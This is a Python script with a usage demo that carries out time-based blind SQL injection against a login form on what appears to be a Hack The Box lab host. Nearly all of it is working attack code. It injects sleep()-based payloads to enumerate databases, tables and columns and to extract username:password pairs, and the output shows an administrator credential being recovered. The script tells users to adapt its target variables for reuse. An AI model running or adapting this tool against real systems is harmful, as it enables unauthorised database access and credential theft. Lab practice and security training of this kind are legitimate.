# Script.py

```python
#!/bin/python3
import requests, time, string, sys, signal
import urllib3; urllib3.disable_warnings()
from termcolor import colored as color

def def_handler(sig, frame):
    options()
signal.signal(signal.SIGINT, def_handler)

# ----------- VARIABLES GLOBALES ---------------------------------------------------- # 
DATABASE, TABLA, COLUMNA1, COLUMNA2 = "", "", "", ""; METHOD = "POST"; TIEMPO = 2

def make_request(sqli):
    URL = "https://admin-portal.europacorp.htb/login.php"
    COOKIES = {"security":"low", "PHPSESSID":"h61523cmuaumat4lkblat0dtq7"}
    HEADERS = ""
    DATA = {"email": "admin@europacorp.htb" + sqli, "password":"test"}    
# ----------------------------------------------------------------------------------- #    
    inicio = time.time()
    if METHOD == "GET":
        req = requests.get(URL, cookies=COOKIES, headers=HEADERS, verify=False)
    elif METHOD == "POST":
        req = requests.post(URL, data=DATA, cookies=COOKIES, headers=HEADERS, verify=False)
    final = time.time()
    return final - inicio

def three_loops(sql, limit, position):
    result = ""; sleeping = f"',sleep({str(TIEMPO)}),1)-- -"
    for i in range(limit):
        for pos in range(1, position):
            found_letter = False
            for letter in caracteres:
                if sql == "db":
                    sqli = f"' and if(substr(DATABASE(),{str(pos)},1)='{letter}{sleeping}"
                elif sql == "db2":
                    sqli = f"' and if(substr((select schema_name from information_schema.schemata limit " 
                    sqli += f"{str(i)},1),{str(pos)},1)='{letter}{sleeping}"
                elif sql == "tb":
                    sqli = "' and if(substr((select table_name from information_schema.tables where"
                    sqli += f" table_schema ='{DATABASE}' limit {str(i)},1),{str(pos)},1)='{letter}{sleeping}"
                elif sql == "cl":
                    sqli = "' and if(substr((select column_name from information_schema.columns where"
                    sqli += f" table_schema='{DATABASE}' and table_name='{TABLA}' limit {str(i)},1)," 
                    sqli += f"{str(pos)},1)='{letter}{sleeping}"
                elif sql == "dt":
                    sqli = f"' and if(substr((select group_concat({COLUMNA1},0x3a,{COLUMNA2}) from "
                    sqli += f"{TABLA}), {str(pos)},1)='{letter}{sleeping}"
                tiempo = make_request(sqli)
                if tiempo > TIEMPO:
                    result += letter; found_letter = True; print(result)
                    break
            if not found_letter:
                result += ","
                break      

def options():
    sql = input(color("[*] Mode (db/db2/tb/cl/dt): ", "yellow"))
    global DATABASE; global TABLA; global COLUMNA1; global COLUMNA2
    match sql:
        case "db":
            print(color(f"\n[*] Actual database: ", "yellow")); three_loops(sql, 2, 10)
        case "db2":
            print(color(f"\n[*] Other databases: ", "yellow")); three_loops(sql, 10, 10)
        case "tb":
            DATABASE = input(color(f"\t> database: ", "yellow"))
            print(color(f"\n[*] Tables inside the database: ", "yellow")); three_loops(sql, 10, 20)
        case "cl":
            DATABASE = input(color(f"\t> database: ", "yellow"))
            TABLA = input(color(f"\t> tabla: ", "yellow"))
            print(color(f"\n[*] Columns of the table: ", "yellow")); three_loops(sql, 10, 30)
        case "dt":
            DATABASE = input(color(f"\t> database: ", "yellow"))
            TABLA = input(color(f"\t> tabla: ", "yellow"))
            COLUMNA1 = input(color(f"\t> first column: ", "yellow"))
            COLUMNA2 = input(color(f"\t> second column: ", "yellow"))
            print(color(f"\n[*] Credentials: ", "yellow")); three_loops(sql, 10, 50)
        case _:
            print(color(f"\n[*] Exiting... ", "yellow")); sys.exit(0)

print(color(f"[*] MODOS ", "yellow"))
print(color("╔════════════════╦════════════════╦═════════════╦══════════════╦═══════════╗", "yellow"))
print(color("║ db = actual db ║ db2 = other db ║ tb = tables ║ cl = columns ║ dt = data ║", "yellow"))
print(color("╚════════════════╩════════════════╩═════════════╩══════════════╩═══════════╝", "yellow"))
print(color("\n[!] Adapt global variables inside the script to make it work", "yellow"))
caracteres = string.ascii_lowercase + "_" + string.digits + string.punctuation; options()
```

--------------------

# Usage

```
$: python3 blind.py
[*] MODOS 
╔════════════════╦════════════════╦═════════════╦══════════════╦═══════════╗
║ db = actual db ║ db2 = other db ║ tb = tables ║ cl = columns ║ dt = data ║
╚════════════════╩════════════════╩═════════════╩══════════════╩═══════════╝

[!] Adapt global variables inside the script to make it work
[*] Mode (db/db2/tb/cl/dt): dt
	> database: admin
	> tabla: users
	> first column: username
	> second column: password

[*] Credentials: 
a
ad
adm
admi
admin
admini
adminis
administ
administr
administra
administrat
administrato
administrator
administrator:
administrator:2
```
